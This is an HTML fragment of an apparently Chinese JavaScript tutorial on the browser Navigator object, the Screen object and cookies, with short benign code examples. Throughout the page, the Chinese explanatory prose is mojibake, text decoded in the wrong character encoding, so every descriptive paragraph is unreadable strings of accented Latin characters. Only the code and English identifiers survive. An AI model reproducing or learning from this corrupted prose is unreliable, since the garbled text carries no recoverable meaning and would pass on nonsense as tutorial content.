<h4 id="Navigator-plugins"><a href="#Navigator-plugins" class="headerlink" title="Navigator.plugins"></a>Navigator.plugins</h4><p><code>Navigator.plugins</code>å±æ€§è¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæˆå‘˜æ˜¯ Plugin å®ä¾‹å¯¹è±¡ï¼Œè¡¨ç¤ºæµè§ˆå™¨å®‰è£…çš„æ’ä»¶ï¼Œæ¯”å¦‚ Flashã€ActiveX ç­‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var pluginsLength &#x3D; navigator.plugins.length;</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; pluginsLength; i++) &#123;</span><br><span class="line">  console.log(navigator.plugins[i].name);</span><br><span class="line">  console.log(navigator.plugins[i].filename);</span><br><span class="line">  console.log(navigator.plugins[i].description);</span><br><span class="line">  console.log(navigator.plugins[i].version);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Navigator-platform"><a href="#Navigator-platform" class="headerlink" title="Navigator.platform"></a>Navigator.platform</h4><p><code>Navigator.platform</code>å±æ€§è¿”å›ç”¨æˆ·çš„æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼Œæ¯”å¦‚<code>MacIntel</code>ã€<code>Win32</code>ã€<code>Linux x86_64</code>ç­‰ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">navigator.platform</span><br><span class="line">&#x2F;&#x2F; &quot;Linux x86_64&quot;</span><br></pre></td></tr></table></figure>

<h4 id="Navigator-onLine"><a href="#Navigator-onLine" class="headerlink" title="Navigator.onLine"></a>Navigator.onLine</h4><p><code>navigator.onLine</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·å½“å‰åœ¨çº¿è¿˜æ˜¯ç¦»çº¿ï¼ˆæµè§ˆå™¨æ–­çº¿ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.onLine &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>æœ‰æ—¶ï¼Œæµè§ˆå™¨å¯ä»¥è¿æ¥å±€åŸŸç½‘ï¼Œä½†æ˜¯å±€åŸŸç½‘ä¸èƒ½è¿é€šå¤–ç½‘ã€‚è¿™æ—¶ï¼Œæœ‰çš„æµè§ˆå™¨çš„<code>onLine</code>å±æ€§ä¼šè¿”å›<code>true</code>ï¼Œæ‰€ä»¥ä¸èƒ½å‡å®šåªè¦æ˜¯<code>true</code>ï¼Œç”¨æˆ·å°±ä¸€å®šèƒ½è®¿é—®äº’è”ç½‘ã€‚ä¸è¿‡ï¼Œå¦‚æœæ˜¯<code>false</code>ï¼Œå¯ä»¥æ–­å®šç”¨æˆ·ä¸€å®šç¦»çº¿ã€‚</p>
<p>ç”¨æˆ·å˜æˆåœ¨çº¿ä¼šè§¦å‘<code>online</code>äº‹ä»¶ï¼Œå˜æˆç¦»çº¿ä¼šè§¦å‘<code>offline</code>äº‹ä»¶ï¼Œå¯ä»¥é€šè¿‡<code>window.ononline</code>å’Œ<code>window.onoffline</code>æŒ‡å®šè¿™ä¸¤ä¸ªäº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;offline&#39;, function(e) &#123; console.log(&#39;offline&#39;); &#125;);</span><br><span class="line">window.addEventListener(&#39;online&#39;, function(e) &#123; console.log(&#39;online&#39;); &#125;);</span><br></pre></td></tr></table></figure>

<h4 id="Navigator-languageï¼ŒNavigator-languages"><a href="#Navigator-languageï¼ŒNavigator-languages" class="headerlink" title="Navigator.languageï¼ŒNavigator.languages"></a>Navigator.languageï¼ŒNavigator.languages</h4><p><code>Navigator.language</code>å±æ€§è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„é¦–é€‰è¯­è¨€ã€‚è¯¥å±æ€§åªè¯»ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.language &#x2F;&#x2F; &quot;en&quot;</span><br></pre></td></tr></table></figure>

<p><code>Navigator.languages</code>å±æ€§è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œè¡¨ç¤ºç”¨æˆ·å¯ä»¥æ¥å—çš„è¯­è¨€ã€‚<code>Navigator.language</code>æ€»æ˜¯è¿™ä¸ªæ•°ç»„çš„ç¬¬ä¸€ä¸ªæˆå‘˜ã€‚HTTP è¯·æ±‚å¤´ä¿¡æ¯çš„<code>Accept-Language</code>å­—æ®µï¼Œå°±æ¥è‡ªè¿™ä¸ªæ•°ç»„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.languages  &#x2F;&#x2F; [&quot;en-US&quot;, &quot;en&quot;, &quot;zh-CN&quot;, &quot;zh&quot;, &quot;zh-TW&quot;]</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¿™ä¸ªå±æ€§å‘ç”Ÿå˜åŒ–ï¼Œå°±ä¼šåœ¨<code>window</code>å¯¹è±¡ä¸Šè§¦å‘<code>languagechange</code>äº‹ä»¶ã€‚</p>
<h4 id="Navigator-geolocation"><a href="#Navigator-geolocation" class="headerlink" title="Navigator.geolocation"></a>Navigator.geolocation</h4><p><code>Navigator.geolocation</code>å±æ€§è¿”å›ä¸€ä¸ª Geolocation å¯¹è±¡ï¼ŒåŒ…å«ç”¨æˆ·åœ°ç†ä½ç½®çš„ä¿¡æ¯ã€‚æ³¨æ„ï¼Œè¯¥ API åªæœ‰åœ¨ HTTPS åè®®ä¸‹å¯ç”¨ï¼Œå¦åˆ™è°ƒç”¨ä¸‹é¢æ–¹æ³•æ—¶ä¼šæŠ¥é”™ã€‚</p>
<p>Geolocation å¯¹è±¡æä¾›ä¸‹é¢ä¸‰ä¸ªæ–¹æ³•ã€‚</p>
<ul>
<li>Geolocation.getCurrentPosition()ï¼šå¾—åˆ°ç”¨æˆ·çš„å½“å‰ä½ç½®</li>
<li>Geolocation.watchPosition()ï¼šç›‘å¬ç”¨æˆ·ä½ç½®å˜åŒ–</li>
<li>Geolocation.clearWatch()ï¼šå–æ¶ˆ<code>watchPosition()</code>æ–¹æ³•æŒ‡å®šçš„ç›‘å¬å‡½æ•°</li>
</ul>
<p>æ³¨æ„ï¼Œè°ƒç”¨è¿™ä¸‰ä¸ªæ–¹æ³•æ—¶ï¼Œæµè§ˆå™¨ä¼šè·³å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œè¦æ±‚ç”¨æˆ·ç»™äºˆæˆæƒã€‚</p>
<h4 id="Navigator-cookieEnabled"><a href="#Navigator-cookieEnabled" class="headerlink" title="Navigator.cookieEnabled"></a>Navigator.cookieEnabled</h4><p><code>navigator.cookieEnabled</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„ Cookie åŠŸèƒ½æ˜¯å¦æ‰“å¼€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.cookieEnabled &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¿™ä¸ªå±æ€§åæ˜ çš„æ˜¯æµè§ˆå™¨æ€»çš„ç‰¹æ€§ï¼Œä¸æ˜¯å¦å‚¨å­˜æŸä¸ªå…·ä½“çš„ç½‘ç«™çš„ Cookie æ— å…³ã€‚ç”¨æˆ·å¯ä»¥è®¾ç½®æŸä¸ªç½‘ç«™ä¸å¾—å‚¨å­˜ Cookieï¼Œè¿™æ—¶<code>cookieEnabled</code>è¿”å›çš„è¿˜æ˜¯<code>true</code>ã€‚</p>
<h3 id="Navigator-å¯¹è±¡çš„æ–¹æ³•"><a href="#Navigator-å¯¹è±¡çš„æ–¹æ³•" class="headerlink" title="Navigator å¯¹è±¡çš„æ–¹æ³•"></a>Navigator å¯¹è±¡çš„æ–¹æ³•</h3><h4 id="Navigator-javaEnabled"><a href="#Navigator-javaEnabled" class="headerlink" title="Navigator.javaEnabled()"></a>Navigator.javaEnabled()</h4><p><code>navigator.javaEnabled()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦èƒ½è¿è¡Œ Java Applet å°ç¨‹åºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.javaEnabled() &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<h4 id="Navigator-sendBeacon"><a href="#Navigator-sendBeacon" class="headerlink" title="Navigator.sendBeacon()"></a>Navigator.sendBeacon()</h4><p><code>Navigator.sendBeacon()</code>æ–¹æ³•ç”¨äºå‘æœåŠ¡å™¨å¼‚æ­¥å‘é€æ•°æ®ï¼Œè¯¦è§ã€ŠXMLHttpRequest å¯¹è±¡ã€‹ä¸€ç« ã€‚</p>
<h3 id="Navigator-çš„å®éªŒæ€§å±æ€§"><a href="#Navigator-çš„å®éªŒæ€§å±æ€§" class="headerlink" title="Navigator çš„å®éªŒæ€§å±æ€§"></a>Navigator çš„å®éªŒæ€§å±æ€§</h3><p>Navigator å¯¹è±¡æœ‰ä¸€äº›å®éªŒæ€§å±æ€§ï¼Œåœ¨éƒ¨åˆ†æµè§ˆå™¨å¯ç”¨ã€‚</p>
<h4 id="Navigator-deviceMemory"><a href="#Navigator-deviceMemory" class="headerlink" title="Navigator.deviceMemory"></a>Navigator.deviceMemory</h4><p><code>navigator.deviceMemory</code>å±æ€§è¿”å›å½“å‰è®¡ç®—æœºçš„å†…å­˜æ•°é‡ï¼ˆå•ä½ä¸º GBï¼‰ã€‚è¯¥å±æ€§åªè¯»ï¼Œåªåœ¨ HTTPS ç¯å¢ƒä¸‹å¯ç”¨ã€‚</p>
<p>å®ƒçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªè¿‘ä¼¼å€¼ï¼Œå››èˆäº”å…¥åˆ°æœ€æ¥è¿‘çš„2çš„å¹‚ï¼Œé€šå¸¸æ˜¯ 0.25ã€0.5ã€1ã€2ã€4ã€8ã€‚å®é™…å†…å­˜è¶…è¿‡ 8GBï¼Œä¹Ÿè¿”å›<code>8</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (navigator.deviceMemory &gt; 1) &#123;</span><br><span class="line">  await import(&#39;.&#x2F;costly-module.js&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œåªæœ‰å½“å‰å†…å­˜å¤§äº 1GBï¼Œæ‰åŠ è½½å¤§å‹çš„è„šæœ¬ã€‚</p>
<h4 id="Navigator-hardwareConcurrency"><a href="#Navigator-hardwareConcurrency" class="headerlink" title="Navigator.hardwareConcurrency"></a>Navigator.hardwareConcurrency</h4><p><code>navigator.hardwareConcurrency</code>å±æ€§è¿”å›ç”¨æˆ·è®¡ç®—æœºä¸Šå¯ç”¨çš„é€»è¾‘å¤„ç†å™¨çš„æ•°é‡ã€‚è¯¥å±æ€§åªè¯»ã€‚</p>
<p>ç°ä»£è®¡ç®—æœºçš„ CPU æœ‰å¤šä¸ªç‰©ç†æ ¸å¿ƒï¼Œæ¯ä¸ªç‰©ç†æ ¸å¿ƒæœ‰æ—¶æ”¯æŒä¸€æ¬¡è¿è¡Œå¤šä¸ªçº¿ç¨‹ã€‚å› æ­¤ï¼Œå››æ ¸ CPU å¯ä»¥æä¾›å…«ä¸ªé€»è¾‘å¤„ç†å™¨æ ¸å¿ƒã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (navigator.hardwareConcurrency &gt; 4) &#123;</span><br><span class="line">  await import(&#39;.&#x2F;costly-module.js&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œå¯ç”¨çš„é€»è¾‘å¤„ç†å™¨å¤§äº4ï¼Œæ‰ä¼šåŠ è½½å¤§å‹è„šæœ¬ã€‚</p>
<p>è¯¥å±æ€§é€šè¿‡ç”¨äºåˆ›å»º Web Workerï¼Œæ¯ä¸ªå¯ç”¨çš„é€»è¾‘å¤„ç†å™¨éƒ½åˆ›å»ºä¸€ä¸ª Workerã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let workerList &#x3D; [];</span><br><span class="line"></span><br><span class="line">for (let i &#x3D; 0; i &lt; window.navigator.hardwareConcurrency; i++) &#123;</span><br><span class="line">  let newWorker &#x3D; &#123;</span><br><span class="line">    worker: new Worker(&#39;cpuworker.js&#39;),</span><br><span class="line">    inUse: false</span><br><span class="line">  &#125;;</span><br><span class="line">  workerList.push(newWorker);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œæœ‰å¤šå°‘ä¸ªå¯ç”¨çš„é€»è¾‘å¤„ç†å™¨ï¼Œå°±åˆ›å»ºå¤šå°‘ä¸ª Web Workerã€‚</p>
<h4 id="Navigator-connection"><a href="#Navigator-connection" class="headerlink" title="Navigator.connection"></a>Navigator.connection</h4><p><code>navigator.connection</code>å±æ€§è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«å½“å‰ç½‘ç»œè¿æ¥çš„ç›¸å…³ä¿¡æ¯ã€‚</p>
<ul>
<li>downlinkï¼šæœ‰æ•ˆå¸¦å®½ä¼°è®¡å€¼ï¼ˆå•ä½ï¼šå…†æ¯”ç‰¹&#x2F;ç§’ï¼ŒMbpsï¼‰ï¼Œå››èˆäº”å…¥åˆ°æ¯ç§’ 25KB çš„æœ€æ¥è¿‘å€æ•°ã€‚</li>
<li>downlinkMaxï¼šå½“å‰è¿æ¥çš„æœ€å¤§ä¸‹è¡Œé“¾è·¯é€Ÿåº¦ï¼ˆå•ä½ï¼šå…†æ¯”ç‰¹æ¯ç§’ï¼ŒMbpsï¼‰ã€‚</li>
<li>effectiveTypeï¼šè¿”å›è¿æ¥çš„ç­‰æ•ˆç±»å‹ï¼Œå¯èƒ½çš„å€¼ä¸º<code>slow-2g</code>ã€<code>2g</code>ã€<code>3g</code>ã€<code>4g</code>ã€‚</li>
<li>rttï¼šå½“å‰è¿æ¥çš„ä¼°è®¡æœ‰æ•ˆå¾€è¿”æ—¶é—´ï¼Œå››èˆäº”å…¥åˆ°æœ€æ¥è¿‘çš„25æ¯«ç§’çš„å€æ•°ã€‚</li>
<li>saveDataï¼šç”¨æˆ·æ˜¯å¦è®¾ç½®äº†æµè§ˆå™¨çš„å‡å°‘æ•°æ®ä½¿ç”¨é‡é€‰é¡¹ï¼ˆæ¯”å¦‚ä¸åŠ è½½å›¾ç‰‡ï¼‰ï¼Œè¿”å›<code>true</code>æˆ–è€…<code>false</code>ã€‚</li>
<li>typeï¼šå½“å‰è¿æ¥çš„ä»‹è´¨ç±»å‹ï¼Œå¯èƒ½çš„å€¼ä¸º<code>bluetooth</code>ã€<code>cellular</code>ã€<code>ethernet</code>ã€<code>none</code>ã€<code>wifi</code>ã€<code>wimax</code>ã€<code>other</code>ã€<code>unknown</code>ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (navigator.connection.effectiveType &#x3D;&#x3D;&#x3D; &#39;4g&#39;) &#123;</span><br><span class="line">  await import(&#39;.&#x2F;costly-module.js&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œå¦‚æœç½‘ç»œè¿æ¥æ˜¯ 4Gï¼Œåˆ™åŠ è½½å¤§å‹è„šæœ¬ã€‚</p>
<h3 id="Screen-å¯¹è±¡"><a href="#Screen-å¯¹è±¡" class="headerlink" title="Screen å¯¹è±¡"></a>Screen å¯¹è±¡</h3><p>Screen å¯¹è±¡è¡¨ç¤ºå½“å‰çª—å£æ‰€åœ¨çš„å±å¹•ï¼Œæä¾›æ˜¾ç¤ºè®¾å¤‡çš„ä¿¡æ¯ã€‚<code>window.screen</code>å±æ€§æŒ‡å‘è¿™ä¸ªå¯¹è±¡ã€‚</p>
<p>è¯¥å¯¹è±¡æœ‰ä¸‹é¢çš„å±æ€§ã€‚</p>
<ul>
<li><code>Screen.height</code>ï¼šæµè§ˆå™¨çª—å£æ‰€åœ¨çš„å±å¹•çš„é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚é™¤éè°ƒæ•´æ˜¾ç¤ºå™¨çš„åˆ†è¾¨ç‡ï¼Œå¦åˆ™è¿™ä¸ªå€¼å¯ä»¥çœ‹ä½œå¸¸é‡ï¼Œä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚æ˜¾ç¤ºå™¨çš„åˆ†è¾¨ç‡ä¸æµè§ˆå™¨è®¾ç½®æ— å…³ï¼Œç¼©æ”¾ç½‘é¡µå¹¶ä¸ä¼šæ”¹å˜åˆ†è¾¨ç‡ã€‚</li>
<li><code>Screen.width</code>ï¼šæµè§ˆå™¨çª—å£æ‰€åœ¨çš„å±å¹•çš„å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚</li>
<li><code>Screen.availHeight</code>ï¼šæµè§ˆå™¨çª—å£å¯ç”¨çš„å±å¹•é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚å› ä¸ºéƒ¨åˆ†ç©ºé—´å¯èƒ½ä¸å¯ç”¨ï¼Œæ¯”å¦‚ç³»ç»Ÿçš„ä»»åŠ¡æ æˆ–è€… Mac ç³»ç»Ÿå±å¹•åº•éƒ¨çš„ Dock åŒºï¼Œè¿™ä¸ªå±æ€§ç­‰äº<code>height</code>å‡å»é‚£äº›è¢«ç³»ç»Ÿç»„ä»¶çš„é«˜åº¦ã€‚</li>
<li><code>Screen.availWidth</code>ï¼šæµè§ˆå™¨çª—å£å¯ç”¨çš„å±å¹•å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚</li>
<li><code>Screen.pixelDepth</code>ï¼šæ•´æ•°ï¼Œè¡¨ç¤ºå±å¹•çš„è‰²å½©ä½æ•°ï¼Œæ¯”å¦‚<code>24</code>è¡¨ç¤ºå±å¹•æä¾›24ä½è‰²å½©ã€‚</li>
<li><code>Screen.colorDepth</code>ï¼š<code>Screen.pixelDepth</code>çš„åˆ«åã€‚ä¸¥æ ¼åœ°è¯´ï¼ŒcolorDepth è¡¨ç¤ºåº”ç”¨ç¨‹åºçš„é¢œè‰²æ·±åº¦ï¼ŒpixelDepth è¡¨ç¤ºå±å¹•çš„é¢œè‰²æ·±åº¦ï¼Œç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒä»¬éƒ½æ˜¯åŒä¸€ä»¶äº‹ã€‚</li>
<li><code>Screen.orientation</code>ï¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¡¨ç¤ºå±å¹•çš„æ–¹å‘ã€‚è¯¥å¯¹è±¡çš„<code>type</code>å±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå±å¹•çš„å…·ä½“æ–¹å‘ï¼Œ<code>landscape-primary</code>è¡¨ç¤ºæ¨ªæ”¾ï¼Œ<code>landscape-secondary</code>è¡¨ç¤ºé¢ å€’çš„æ¨ªæ”¾ï¼Œ<code>portrait-primary</code>è¡¨ç¤ºç«–æ”¾ï¼Œ<code>portrait-secondary</code>è¡¨ç¤ºé¢ å€’çš„ç«–æ”¾ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯<code>Screen.orientation</code>çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.screen.orientation</span><br><span class="line">&#x2F;&#x2F; &#123; angle: 0, type: &quot;landscape-primary&quot;, onchange: null &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„ä¾‹å­ä¿è¯å±å¹•åˆ†è¾¨ç‡å¤§äº 1024 x 768ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (window.screen.width &gt;&#x3D; 1024 &amp;&amp; window.screen.height &gt;&#x3D; 768) &#123;</span><br><span class="line">  &#x2F;&#x2F; åˆ†è¾¨ç‡ä¸ä½äº 1024x768</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯æ ¹æ®å±å¹•çš„å®½åº¦ï¼Œå°†ç”¨æˆ·å¯¼å‘ä¸åŒç½‘é¡µçš„ä»£ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((screen.width &lt;&#x3D; 800) &amp;&amp; (screen.height &lt;&#x3D; 600)) &#123;</span><br><span class="line">  window.location.replace(&#39;small.html&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  window.location.replace(&#39;wide.html&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>Cookie æ˜¯æœåŠ¡å™¨ä¿å­˜åœ¨æµè§ˆå™¨çš„ä¸€å°æ®µæ–‡æœ¬ä¿¡æ¯ï¼Œä¸€èˆ¬å¤§å°ä¸èƒ½è¶…è¿‡4KBã€‚æµè§ˆå™¨æ¯æ¬¡å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œå°±ä¼šè‡ªåŠ¨é™„ä¸Šè¿™æ®µä¿¡æ¯ã€‚</p>
<p>HTTP åè®®ä¸å¸¦æœ‰çŠ¶æ€ï¼Œæœ‰äº›è¯·æ±‚éœ€è¦åŒºåˆ†çŠ¶æ€ï¼Œå°±é€šè¿‡ Cookie é™„å¸¦å­—ç¬¦ä¸²ï¼Œè®©æœåŠ¡å™¨è¿”å›ä¸ä¸€æ ·çš„å›åº”ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·ç™»å½•ä»¥åï¼ŒæœåŠ¡å™¨å¾€å¾€ä¼šåœ¨ç½‘ç«™ä¸Šç•™ä¸‹ä¸€ä¸ª Cookieï¼Œè®°å½•ç”¨æˆ·ç¼–å·ï¼ˆæ¯”å¦‚<code>id=1234</code>ï¼‰ï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨å‘æœåŠ¡å™¨è¯·æ±‚æ•°æ®ï¼Œå°±ä¼šå¸¦ä¸Šè¿™ä¸ªå­—ç¬¦ä¸²ï¼ŒæœåŠ¡å™¨ä»è€ŒçŸ¥é“æ˜¯è°åœ¨è¯·æ±‚ï¼Œåº”è¯¥å›åº”ä»€ä¹ˆå†…å®¹ã€‚</p>
<p>Cookie çš„ç›®çš„å°±æ˜¯åŒºåˆ†ç”¨æˆ·ï¼Œä»¥åŠæ”¾ç½®çŠ¶æ€ä¿¡æ¯ï¼Œå®ƒçš„ä½¿ç”¨åœºæ™¯ä¸»è¦å¦‚ä¸‹ã€‚</p>
<ul>
<li>å¯¹è¯ï¼ˆsessionï¼‰ç®¡ç†ï¼šä¿å­˜ç™»å½•çŠ¶æ€ã€è´­ç‰©è½¦ç­‰éœ€è¦è®°å½•çš„ä¿¡æ¯ã€‚</li>
<li>ä¸ªæ€§åŒ–ä¿¡æ¯ï¼šä¿å­˜ç”¨æˆ·çš„åå¥½ï¼Œæ¯”å¦‚ç½‘é¡µçš„å­—ä½“å¤§å°ã€èƒŒæ™¯è‰²ç­‰ç­‰ã€‚</li>
<li>è¿½è¸ªç”¨æˆ·ï¼šè®°å½•å’Œåˆ†æç”¨æˆ·è¡Œä¸ºã€‚</li>
</ul>
<p>Cookie ä¸æ˜¯ä¸€ç§ç†æƒ³çš„å®¢æˆ·ç«¯å­˜å‚¨æœºåˆ¶ã€‚å®ƒçš„å®¹é‡å¾ˆå°ï¼ˆ4KBï¼‰ï¼Œç¼ºä¹æ•°æ®æ“ä½œæ¥å£ï¼Œè€Œä¸”ä¼šå½±å“æ€§èƒ½ã€‚å®¢æˆ·ç«¯å­˜å‚¨å»ºè®®ä½¿ç”¨ Web storage API å’Œ IndexedDBã€‚åªæœ‰é‚£äº›æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦è®©æœåŠ¡å™¨çŸ¥é“çš„ä¿¡æ¯ï¼Œæ‰åº”è¯¥æ”¾åœ¨ Cookie é‡Œé¢ã€‚</p>
<p>æ¯ä¸ª Cookie éƒ½æœ‰ä»¥ä¸‹å‡ æ–¹é¢çš„å…ƒæ•°æ®ã€‚</p>
<ul>
<li>Cookie çš„åå­—</li>
<li>Cookie çš„å€¼ï¼ˆçœŸæ­£çš„æ•°æ®å†™åœ¨è¿™é‡Œé¢ï¼‰</li>
<li>åˆ°æœŸæ—¶é—´ï¼ˆè¶…è¿‡è¿™ä¸ªæ—¶é—´ä¼šå¤±æ•ˆï¼‰</li>
<li>æ‰€å±åŸŸåï¼ˆé»˜è®¤ä¸ºå½“å‰åŸŸåï¼‰</li>
<li>ç”Ÿæ•ˆçš„è·¯å¾„ï¼ˆé»˜è®¤ä¸ºå½“å‰ç½‘å€ï¼‰</li>
</ul>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·è®¿é—®ç½‘å€<code>www.example.com</code>ï¼ŒæœåŠ¡å™¨åœ¨æµè§ˆå™¨å†™å…¥ä¸€ä¸ª Cookieã€‚è¿™ä¸ª Cookie çš„æ‰€å±åŸŸåä¸º<code>www.example.com</code>ï¼Œç”Ÿæ•ˆè·¯å¾„ä¸ºæ ¹è·¯å¾„<code>/</code>ã€‚</p>
<p>å¦‚æœ Cookie çš„ç”Ÿæ•ˆè·¯å¾„è®¾ä¸º<code>/forums</code>ï¼Œé‚£ä¹ˆè¿™ä¸ª Cookie åªæœ‰åœ¨è®¿é—®<code>www.example.com/forums</code>åŠå…¶å­è·¯å¾„æ—¶æ‰æœ‰æ•ˆã€‚ä»¥åï¼Œæµè§ˆå™¨è®¿é—®æŸä¸ªè·¯å¾„ä¹‹å‰ï¼Œå°±ä¼šæ‰¾å‡ºå¯¹è¯¥åŸŸåå’Œè·¯å¾„æœ‰æ•ˆï¼Œå¹¶ä¸”è¿˜æ²¡æœ‰åˆ°æœŸçš„ Cookieï¼Œä¸€èµ·å‘é€ç»™æœåŠ¡å™¨ã€‚</p>
<p>ç”¨æˆ·å¯ä»¥è®¾ç½®æµè§ˆå™¨ä¸æ¥å— Cookieï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä¸å‘æœåŠ¡å™¨å‘é€ Cookieã€‚<code>window.navigator.cookieEnabled</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦æ‰“å¼€ Cookie åŠŸèƒ½ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.navigator.cookieEnabled &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p><code>document.cookie</code>å±æ€§è¿”å›å½“å‰ç½‘é¡µçš„ Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x2F;&#x2F; &quot;id&#x3D;foo;key&#x3D;bar&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸åŒæµè§ˆå™¨å¯¹ Cookie æ•°é‡å’Œå¤§å°çš„é™åˆ¶ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå•ä¸ªåŸŸåè®¾ç½®çš„ Cookie ä¸åº”è¶…è¿‡30ä¸ªï¼Œæ¯ä¸ª Cookie çš„å¤§å°ä¸èƒ½è¶…è¿‡ 4KBã€‚è¶…è¿‡é™åˆ¶ä»¥åï¼ŒCookie å°†è¢«å¿½ç•¥ï¼Œä¸ä¼šè¢«è®¾ç½®ã€‚</p>
